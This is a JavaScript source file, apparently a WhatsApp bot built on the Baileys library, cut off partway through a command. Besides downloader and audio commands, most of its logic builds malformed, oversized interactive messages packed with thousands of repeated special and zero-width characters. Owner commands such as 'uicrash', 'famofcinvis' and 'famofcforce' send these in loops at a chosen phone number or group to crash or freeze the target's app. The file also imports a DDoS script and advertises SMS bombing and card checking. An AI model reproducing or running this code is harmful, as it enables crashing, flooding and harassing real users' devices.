


//base by © sevenz/Yuri
//developer famofc
//deployer owneroftbh
//don't change a credit 








require("./config")
const {
generateMessageIDV2, 
generateMessageID, 
WA_DEFAULT_EPHEMERAL, 
getAggregateVotesInPollMessage,
generateWAMessageFromContent,
proto, 
generateWAMessageContent,
 generateWAMessage, 
prepareWAMessageMedia,
downloadContentFromMessage, 
areJidsSameUser,
 getContentType, 
useMultiFileAuthState,
 makeWASocket, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore,
 makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const path = require('path')
let aiMode = false; // Default: AI Mode is OFF




module.exports = async (conn, m) => {
try {
const from = m.key.remoteJid
const info = m.message

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, getPing, tanggal, getRandom } = require('./lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix

const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = m.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)

const senderNumber = sender.split('@')[0]

const pushname = m.pushName || `${senderNumber}`
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:famofcyt@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/faheemxyz\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Gabon;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
conn.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}

const isBot = m.key.fromMe ? true : false
const os = require('os')
const time = hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const data = date = dataa = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
const isGroup = m.chat.endsWith("@g.us")
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
		const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
		const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
const pickRandom = (arr) => {return arr[Math.floor(Math.random() * arr.length)]}
const famofc = fs.readFileSync('./famofc_v11/famofc.jpg')

const { startDDoS } = require('./famofc_v11/DDoS'); // DDoS Attack Script کو امپورٹ کریں
const { teksbug2 } = require("./famofc_v11/delay.js")


if (aiMode && text) { 
    await getAIResponse(text, m);
}

if (m.message) {
console.log(`
╭─────────────────────────────────
│〔 OF 〕: ${sender}
│
│〔 MESSAGE 〕: ${body}
│
│〔 NAME 〕: ${pushname} 
│
│〔 TYPE 〕: ${m.mtype}
│
╰─────────────────────────────────`) 
}


const numeroFormatado = q.replace(/[^\d]/g, '');
const numi = numeroFormatado + '@s.whatsapp.net'


const reply = (texto) => {
    conn.sendMessage(from, { text: texto }, { quoted: m });
};



async function TrashSocket(isTarget) {
    const repeatButton = (name, json) => {
        return Array(1).fill(0).map(() => ({
            name,
            buttonParamsJson: json
        }));
    };

    const cancelButton = repeatButton(
        "cta_cancel_reminder",
        `{\"display_text\":\"${"REYHANN6610" + "𑶑".repeat(1000)}\",\"id\":\"\"}`
    );

    const randomJid = () => {
        const randomNum = Math.floor(1000000000 + Math.random() * 9000000000);
        return `${randomNum}@s.whatsapp.net`;
    };

    const groupJid = `${Math.floor(1000000000 + Math.random() * 9000000000)}@g.us`;

    const mentions = [
        isTarget,
        ...Array.from({ length: 50 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) // Reduced size
    ];

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: null
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: null
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: "ꦾꦸ".repeat(1000), // Reduced repeat count
                        subtitle: null,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: null
                            },
                            ...cancelButton,
                        ]
                    })
                })
            }
        }
    }, {
        quoted: {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
            },
            message: {
                paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                }
            },
            contextInfo: {
                isSampled: true,
                mentionedJid: mentions,
                fromMe: false,
                groupMentions: [{
                    groupJid: groupJid,
                    groupSubject: mentions.join('')
                }],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363194914375334@newsletter",
                    serverMessageId: "3EB0ABCDEF123456789",
                    newsletterName: global.namaBot
                }
            }
        }
    });

    await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });

    // Pin message (optional, may not work due to WhatsApp restrictions)
    try {
        await conn.sendMessage(
            isTarget,
            {
                pin: {
                    type: 1,
                    time: 2592000,
                    key: { id: msg.key.id, remoteJid: msg.key.remoteJid }
                }
            }
        );
    } catch (error) {
        console.error("Pin Message Error:", error);
    }
}

async function delayMakerInvisible(isTarget) {
    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: {
                    "CB:ib,,dirty": ["Array"]
                },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    connCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnconnCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });
    let stanza = [{
        attrs: { biz_bot: "1" },
        tag: "bot"
    }, {
        attrs: {},
        tag: "biz"
    }];
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸${"𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗 - 🩸 ${"﹏".repeat(1000)}` // Reduced repeat count
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: isTarget },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"]
                    },
                    body: { text: "" + "ꦽ".repeat(1000) + "".repeat(1000) }, // Reduced repeat count
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "".repeat(999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "".repeat(999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "".repeat(999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };
    await conn.relayMessage(isTarget, message, { participant: { jid: isTarget } });
}

async function FloodsCarousel(isTarget, Ptcp = true) {
    const header = {
        locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
        },
        hasMediaAttachment: true,
    };
    const body = {
        text: "404 - 𝐉𝚺͢𝐗𝐏𝐋𝚹𝐈𝐓-𝐗🐉" + "᭯".repeat(1000), // Reduced repeat count
    };
    const carouselMessage = {
        sections: [
            {
                title: "\u200C".repeat(1000),
                rows: [
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                ],
            },
            {
                title: "\u200c".repeat(1000),
                rows: [
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                ],
            },
            {
                title: "\u200c".repeat(1000),
                rows: [
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                ],
            },
            {
                title: "\u200c".repeat(1000),
                rows: [
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                    { title: "\u200D".repeat(1000), description: "\u200D".repeat(1000), rowId: "\u200D".repeat(1000) },
                ],
            },
        ],
    };
    await conn.relayMessage(isTarget, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: header,
                    body: body,
                    carouselMessage: carouselMessage,
                },
            },
        },
    }, Ptcp ? { participant: { jid: isTarget } } : { quoted: null });
}

async function sendFakeMessage(jides,definirText) {await conn.relayMessage(jides, {extendedTextMessage: {text: definirText},"deviceSentMessage": {"phash": ""}}, {});}


const qloc = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: `status@broadcast`
        } : {})
      },
      message: {
        contactMessage: {
          displayName: `fam bot`,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=923350963366:+923350963366\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
          sendEphemeral: true
        }
      }
    };
        const {
	        remini
       } = require("./famofc_v11/remini")

const imagePath = './famofc_v11/famofc.jpg';  
const audioPath = './famofc_v11/Famzysound.mp3';  
const malik = './famofc_v11/Malik.mp3';
const sigma = './famofc_v11/sigma.mp3';
const credsPath = "./auth/creds.json";
// Preload image and audio buffers to avoid redundant disk reads
const maliksong = fs.readFileSync(malik);
const sigmasong = fs.readFileSync(sigma);
const imageBuffer = fs.readFileSync(imagePath);
const audioBuffer = fs.readFileSync(audioPath);

const famreply22 = (teks) => {
conn.sendMessage(from, { text : teks }, { quoted : m })
}

const famreply2 = async (texto) => {
    await conn.sendMessage(m.chat, {
        text: texto,
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: "fam vip bot",
                newsletterJid: "120363390114292114@newsletter"
            },
            isForwarded: true,
            externalAdReply: {
                title: "fam vip bot v11",
                thumbnailUrl: 'https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg',
                sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C"
            }
        }
    }, { quoted: qloc });
};

const famreply = async (texto) => {
    await conn.sendMessage(m.chat, {
        text: texto,
        contextInfo: {
            forwardingScore: 99999,
            externalAdReply: {
                body: "Created By FAM OFC",
                containsAutoReply: true,
                mediaType: 1,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                sourceUrl: "https://whatsapp.com/channel/0029Vb2pMIt1NCrUCy9Q0f3C",
                thumbnail: imageBuffer,
                thumbnailUrl: "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg",
                title: "FAM OFC"
            }
        }
    }, { quoted: qloc });
};


const ownerFile = "./database/owner.json";

// 📂 Read & Write Owner Data
const getOwners = () => {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile));
};
const saveOwners = (owners) => {
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));
};

// 🔥 Check if User is Owner
const isCreator = (sender) => {
    const owners = getOwners();
    return owners.includes(sender);
};



async function carouselnolos(target, amount, ptcp = false) {
    if (!isCreator(sender)) {
        await famreply2("❌ *Only the Owner can use this command!*");
        return;
    }

    // Validate amount
    if (isNaN(amount) || amount < 1 || amount > 100) {
        await famreply2("❌ *Invalid amount!* Please specify a number between 1 and 100.");
        return;
    }

    let push = [];
    try {
        for (let i = 0; i < amount; i++) {
            let etc = await generateWAMessageFromContent(target,
                proto.Message.fromObject({
                    ephemeralMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "FAM ui bug" + "ꦾ".repeat(1000), // Reduced for safety
                                    locationMessage: {
                                        degreesLatitude: -999.03499999999999,
                                        degreesLongitude: 922.999999999999,
                                        name: "𝐅𝐀𝐌 𝐎𝐅𝐂🐉",
                                        address: "🎭⃟༑⌁⃰𝐅𝐀𝐌 𝐎𝐅𝐂 𝑪‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌🐉",
                                        jpegThumbnail: null
                                    },
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: "Are You Ready To Die?" + "ꦾ".repeat(1000) // Reduced for safety
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                                    buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "🎭⃟༑⌁⃰𝐅𝐀𝐌 𝐎𝐅𝐂 𝑪‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌🐉",
                                            sections: [{
                                                title: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
                                                rows: Array.from({length: 10}, () => ({ // Reduced rows for performance
                                                    title: "𓂀".repeat(100),
                                                    description: "@1".repeat(500),
                                                    rowId: "x".repeat(20)
                                                }))
                                            }]
                                        })
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}" // Assuming apidevils is not needed
                                    }]
                                }
                            }
                        }
                    }
                }), {
                    userJid: target,
                    quoted: null
                }
            );
            push.push(etc);
            await conn.relayMessage(target, etc.message, ptcp ? {
                participant: {
                    jid: target
                }
            } : {});
            console.log(chalk.green(`Success send Protocol ${i + 1}/${amount}`));
        }
        return push;
    } catch (error) {
        console.error("uicrash Error:", error);
        await famreply2(`❌ *Error:* Failed to send carousel messages. ${error.message}`);
        return [];
    }
}


async function loadingx() {
    const loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
      
    ];

    // Send initial message and get key for editing
    let { key } = await conn.sendMessage(m.chat, {
        text: "*✅*"
    }, { quoted: m });

    // Loop through loading stages and edit message
    for (let i = 0; i < loadingz.length; i++) {
        await sleep(400); // 400ms delay between updates
        await conn.sendMessage(m.chat, { 
            text: loadingz[i], 
            edit: key 
        }, { quoted: m });
    }
}




switch(command) {
case "public": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");

    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} <on|off>\nExample: ${prefix + command} on\n\n🔥 *Powered by FAM OFC* *Deployed by owner of TBH*`);
    }

    const mode = text.toLowerCase();
    if (mode === "on") {
        if (conn.public) return famreply2("✅ *Public mode is already enabled!*");
        conn.public = true;
        await famreply2("✅ *Public Mode Enabled!* Now everyone can use the bot.\n\n🔥 *Powered by FAM OFC* *Deployed by owner of TBH*");
    } else if (mode === "off") {
        if (!conn.public) return famreply2("✅ *Self mode is already enabled!*");
        conn.public = false;
        await famreply2("✅ *Self Mode Enabled!* Only the owner can use the bot.\n\n🔥 *Powered by FAM OFC*");
    } else {
        return famreply2("❌ *Invalid input!* Use 'on' or 'off'.\nExample: .public on");
    }
}
break;
case "famofcinvis": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <phone_number>\nExample: ${prefix + command} 923xxx`);

    let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let isTarget = pelaku;
    
    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
         // Show loading animation

        for (let r = 0; r < 10; r++) { // Reduced iterations for safety
            await delayMakerInvisible(isTarget);
            await sleep(2000); // Reduced delay
            await delayMakerInvisible(isTarget);
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(`*Information Attack*\n*Target:* ${pelaku.split('@')[0]}\n*Status:* Success\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("famofcinvis Error:", error);
        await famreply2(`❌ *Error:* Failed to execute attack. ${error.message}`);
    }
}
break;

case "famofccore": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <phone_number>\nExample: ${prefix + command} 923xxx`);

    let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let isTarget = pelaku;

    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        

        for (let r = 0; r < 10; r++) { // Reduced iterations
            await FloodsCarousel(isTarget, true);
            await sleep(2000);
            await FloodsCarousel(isTarget, true);
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(`*Information Attack*\n*Target:* ${pelaku.split('@')[0]}\n*Status:* Success\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("famofccore Error:", error);
        await famreply2(`❌ *Error:* Failed to execute attack. ${error.message}`);
    }
}
break;

case "famofckontol": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <phone_number>\nExample: ${prefix + command} 923xxx`);

    let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let isTarget = pelaku;

    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        

        for (let r = 0; r < 10; r++) { // Reduced iterations
            await delayMakerInvisible(isTarget);
            await TrashSocket(isTarget);
            await sleep(2000);
            await FloodsCarousel(isTarget, true);
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(`*Information Attack*\n*Target:* ${pelaku.split('@')[0]}\n*Status:* Success\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("famofckontol Error:", error);
        await famreply2(`❌ *Error:* Failed to execute attack. ${error.message}`);
    }
}
break;

case "famofcforce": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");
    if (!text) return famreply2(`📌 *Usage:* ${prefix + command} <phone_number>\nExample: ${prefix + command} 923xxx`);

    let pelaku = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    let isTarget = pelaku;

    try {
        await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
        

        for (let r = 0; r < 10; r++) { // Reduced iterations
            await delayMakerInvisible(isTarget);
            await FloodsCarousel(isTarget, true);
            await sleep(2000);
            await delayMakerInvisible(isTarget);
            await FloodsCarousel(isTarget, true);
        }

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        await famreply2(`*Information Attack*\n*Target:* ${pelaku.split('@')[0]}\n*Status:* Success\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("famofcforce Error:", error);
        await famreply2(`❌ *Error:* Failed to execute attack. ${error.message}`);
    }
}
break;
case "repo":
case "sc":{
famreply2(`*FAM OFC BOT – Ultimate WhatsApp Automation Unleashed!* 🚀  
Welcome to the world of *FAM OFC BOT, a game-changing WhatsApp tool designed by Faheem* for VIP users! Packed with advanced features like CC checking, AI chatbot, SMS bombing, IP tracking, and more, this bot brings power and style with its modern UI. Whether you're automating tasks or exploring its powerful utilities, FAM OFC BOT has you covered.  

🎊 *YouTube* 

https://youtu.be/_VCl5BlYRXs?si=DruBmHA7G1gPAf5g

🔥 *Download bot*

full script no enc hy koi bhe agr case ya function mare script sy nekaly to fam ofc ka credit zaror add kry

 ()
 `)}
break 

case "uicrash": {
    if (!isCreator(sender)) return famreply2("❌ *Only the Owner can use this command!*");

    if (!text || !text.includes("|")) {
        return famreply2(`📌 *Usage:* ${prefix + command} <group_id | phone_number>|<amount>\nExample: ${prefix + command} 120363xxx@g.us|10 or ${prefix + command} 923xxx|5\n\n🔥 *Powered by FAM OFC*`);
    }

    const [targetInput, amountInput] = text.split("|");
    const amount = parseInt(amountInput);

    // Validate amount
    if (isNaN(amount) || amount < 1 || amount > 100) {
        return famreply2("❌ *Invalid amount!* Please specify a number between 1 and 100.\n\n🔥 *Powered by FAM OFC*");
    }

    let target = m.chat; // Default to current chat
    let ptcp = false;

    // Validate and format target
    if (targetInput.includes("@g.us")) {
        target = targetInput; // Group JID
        ptcp = true; // Enable participant mode for groups
    } else if (targetInput.match(/^\d+$/)) {
        target = targetInput.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; // User JID
    } else {
        return famreply2(`❌ *Invalid target!* Use a group ID (e.g., 120363xxx@g.us) or phone number (e.g., 923xxx).\n\n🔥 *Powered by FAM OFC*`);
    }

    try {
         // Show loading animation
        await carouselnolos(target, amount, ptcp);
        await famreply2(`✅ *${amount} carousel messages sent successfully to ${target}!*\n\n🔥 *Powered by FAM OFC*`);
    } catch (error) {
        console.error("uicrash Command Error:", error);
        await famreply2(`❌ *Error:* ${error.message || "Failed to send carousel messages."}`);
    }
}
break;
case "malik": {
    await conn.sendMessage(m.chat, { audio: maliksong, mimetype: 'audio/mpeg', ptt: true }, { quoted: qloc });
    }
break;
case "sigma": {
await conn.sendMessage(m.chat, { audio: sigmasong, mimetype: 'audio/mpeg', ptt: true }, { quoted: qloc });
}
break;


case "igdl":
case "ig": {
    // Check if Instagram URL is provided
    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} <instagram_url>\nExample: ${prefix + command} https://www.instagram.com/reel/DIotG-1Nfm5/\n\n🔥 *Powered by FAM OFC*`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url) || !url.includes("instagram.com")) {
        return famreply2("❌ *Invalid URL!* Please provide a valid Instagram post or reel URL (e.g., https://www.instagram.com/reel/DIotG-1Nfm5/).");
    }

    try {
        // Send loading animation
        

        // Fetch video from API
        const apiUrl = `https://rest-lily.vercel.app/api/downloader/igdl?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl, {
            headers: { Accept: "*/*" }
        });
        const data = response.data;

        if (data.status === true && data.data && data.data.length > 0 && data.data[0].url) {
            const videoUrl = data.data[0].url;
            const thumbnailUrl = data.data[0].thumbnail || "https://i.ibb.co/P2Gg1Wd/fam-ofc.jpg"; // Fallback thumbnail
            const creator = data.creator || "Unknown";

            // Prepare caption
            const caption = `🎥 *Instagram Downloader*\n\n\n\n\n🔥 *Powered by FAM OFC*`;

            // Send video message
            await conn.sendMessage(m.chat, {
                video: { url: videoUrl },
                caption: caption,
                thumbnailUrl: thumbnailUrl,
                
                
                
            }, { quoted: m });
        } else {
            await famreply2(`❌ *Failed to download video:* ${data.message || "No video found in the provided URL."}\nPlease check the URL and ensure the post/reel is public.`);
        }
    } catch (error) {
        console.error("Instagram Downloader Error:", error);
        await conn.sendMessage(m.chat, { text: `❌ *Error:* ${error.message || "Unable to download Instagram video. Try again later."}` }, { quoted: m });
    }
}
break;


case "webcopy": {
    // Check if URL is provided
    if (!text) {
        return famreply2(`📌 *Usage:* ${prefix + command} <url>\nExample: ${prefix + command} https://example.com\nURL must include http:// or https://`);
    }

    // Validate URL
    const url = text.trim();
    if (!isUrl(url)) {
        return famreply2("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");
    }

    try {
